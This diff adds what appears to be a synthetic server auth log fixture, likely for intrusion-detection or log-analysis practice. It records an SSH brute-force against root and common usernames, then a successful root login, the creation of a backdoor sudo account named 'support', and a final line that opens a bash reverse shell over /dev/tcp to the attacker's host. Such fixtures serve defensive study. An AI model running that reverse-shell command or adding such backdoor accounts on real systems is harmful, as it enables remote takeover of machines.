@@ -1,0 +1,19 @@
+Nov 18 08:00:01 web01 CRON[1021]: pam_unix(cron:session): session opened for user root by (uid=0)
+Nov 18 08:12:44 web01 sshd[2201]: Accepted publickey for deploy from 192.0.2.10 port 50122 ssh2
+Nov 18 09:01:02 web01 sshd[2305]: Failed password for alice from 198.51.100.7 port 41001 ssh2
+Nov 18 09:01:09 web01 sshd[2305]: Failed password for alice from 198.51.100.7 port 41001 ssh2
+Nov 18 09:14:03 web01 sshd[2401]: Failed password for root from 203.0.113.45 port 52001 ssh2
+Nov 18 09:14:06 web01 sshd[2402]: Failed password for invalid user admin from 203.0.113.45 port 52002 ssh2
+Nov 18 09:14:09 web01 sshd[2403]: Failed password for root from 203.0.113.45 port 52003 ssh2
+Nov 18 09:14:12 web01 sshd[2404]: Failed password for invalid user oracle from 203.0.113.45 port 52004 ssh2
+Nov 18 09:14:15 web01 sshd[2405]: Failed password for invalid user test from 203.0.113.45 port 52005 ssh2
+Nov 18 09:14:18 web01 sshd[2406]: Failed password for invalid user ubuntu from 203.0.113.45 port 52006 ssh2
+Nov 18 09:14:21 web01 sshd[2407]: Failed password for invalid user postgres from 203.0.113.45 port 52007 ssh2
+Nov 18 09:14:24 web01 sshd[2408]: Failed password for root from 203.0.113.45 port 52008 ssh2
+Nov 18 09:14:27 web01 sshd[2409]: Failed password for invalid user git from 203.0.113.45 port 52009 ssh2
+Nov 18 09:14:40 web01 sshd[2499]: Accepted password for root from 203.0.113.45 port 52099 ssh2
+Nov 18 09:15:02 web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/useradd -m support
+Nov 18 09:15:10 web01 useradd[2510]: new user: name=support, UID=1005, GID=1005, home=/home/support
+Nov 18 09:15:21 web01 sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo support
+Nov 18 09:16:05 web01 sudo: pam_unix(sudo:auth): authentication failure; logname=alice uid=1001 euid=0 tty=/dev/pts/1 ruser=alice rhost=  user=alice
+Nov 18 09:17:30 web01 bash[2530]: root executed: bash -i >& /dev/tcp/203.0.113.45/4444 0>&1
